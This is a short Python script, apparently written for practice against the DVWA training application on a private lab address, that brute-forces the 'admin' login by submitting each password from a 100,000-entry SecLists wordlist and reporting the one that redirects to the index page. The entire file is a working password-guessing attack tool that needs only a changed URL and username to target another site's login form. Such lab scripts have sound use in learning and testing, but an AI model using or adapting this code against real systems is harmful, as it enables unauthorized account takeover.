#!/usr/bin/env python

import mechanize
import urllib

br = mechanize.Browser()
url = "http://192.168.210.130/dvwa/login.php"
br.open(url)

wordlist = open('/root/tools/SecLists/Passwords/xato-net-10-million-passwords-100000.txt','r')


passwords = wordlist.read().splitlines()

def login_brute():
    for password in passwords:
        br.select_form(nr=0)
        br.form['username'] = 'admin'
        br.form['password'] = password
        response = br.submit()
        if response.geturl() == "http://192.168.210.130/dvwa/index.php":
            print("Password Found: " + password)
            break

login_brute()
print(br.geturl())
print(br.title())
